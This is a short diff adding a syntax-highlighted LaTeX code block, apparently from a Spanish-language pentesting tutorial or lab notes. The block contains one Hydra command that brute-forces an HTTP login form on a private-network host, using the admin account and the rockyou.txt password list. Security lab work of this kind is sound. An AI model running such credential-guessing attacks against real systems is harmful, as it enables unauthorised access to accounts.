@@ -1,0 +1,3 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYG{+w}{        }hydra\PYG{+w}{ }\PYGZhy{}l\PYG{+w}{ }admin\PYG{+w}{ }\PYGZhy{}P\PYG{+w}{ }\PYGZti{}/Desktop/Golum/Hacking/rockyou.txt\PYG{+w}{ }\PYG{l+m}{192}.168.1.139\PYG{+w}{ }http\PYGZhy{}post\PYGZhy{}form\PYG{+w}{ }\PYG{l+s+s2}{\PYGZdq{}/index.php:username=\PYGZca{}USER\PYGZca{}\PYGZam{}password=\PYGZca{}PASS\PYGZca{}:Inicio de sesión fallido\PYGZdq{}}\PYG{+w}{ }\PYGZhy{}t\PYG{+w}{ }\PYG{l+m}{4}
+\end{Verbatim}
